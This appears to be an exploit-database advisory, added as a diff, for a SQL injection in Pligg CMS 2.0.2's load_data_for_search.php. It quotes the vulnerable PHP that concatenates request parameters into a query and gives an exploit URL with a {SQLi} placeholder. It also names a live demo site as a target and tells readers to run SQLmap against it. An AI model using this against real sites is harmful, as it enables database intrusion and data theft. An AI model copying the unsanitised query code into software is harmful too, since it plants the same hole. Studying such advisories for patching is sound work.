@@ -1,0 +1,45 @@
+# Exploit Title: Pligg CMS 2.0.2 SQL injection
+# Date: 29-08-2015
+# Exploit Author: jsass
+# Vendor Homepage: http://pligg.com
+# Software Link: https://github.com/Pligg/pligg-cms/archive/2.0.2.zip
+# Version: 2.0.2
+# Tested on: kali sana 2.0
+
+################ Q8 Gray Hat Team ################
+
+
+
+SQLInjection
+
+File : load_data_for_search.php
+
+
+ $search = new Search();
+	
+	if(isset($_REQUEST['start_up']) and $_REQUEST['start_up']!= '' and $_REQUEST['pagesize'] != ''){
+		
+		$pagesize = $_REQUEST['pagesize'];
+		$start_up = $_REQUEST['start_up'];
+		$limit = " LIMIT $start_up, $pagesize";	
+	}
+	if(isset($_REQUEST['sql']) and $_REQUEST['sql']!= ''){
+		$sql = $_REQUEST['sql'];
+		$search->sql = $sql.$limit;
+	}
+	
+	$fetch_link_summary = true;
+	$linksum_sql = $sql.$limit;
+
+Exploit : http://localhost/pligg-cms-master/load_data_for_search.php?sql={SQLi}
+
+Type Injection : Boolean & Time Based 
+
+Use SQLmap To Inject ..
+
+Demo : http://www.pligg.science/load_data_for_search.php?sql={SQLi}
+
+
+################ Q8 Gray Hat Team ################
+
+Great's To : sec4ever.com && alm3refh.com
